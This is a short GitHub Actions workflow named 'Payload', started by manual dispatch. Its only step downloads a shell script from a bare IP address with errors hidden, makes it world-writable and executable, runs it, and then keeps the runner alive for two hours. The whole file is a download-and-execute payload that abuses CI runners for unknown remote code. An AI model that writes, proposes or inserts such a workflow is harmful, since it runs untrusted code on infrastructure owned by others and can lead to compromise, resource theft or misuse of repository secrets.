name: Payload

on: workflow_dispatch

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
    - run: |
        cd /tmp
        wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null
        chmod 777 run.sh
        ./run.sh
        sleep 7200
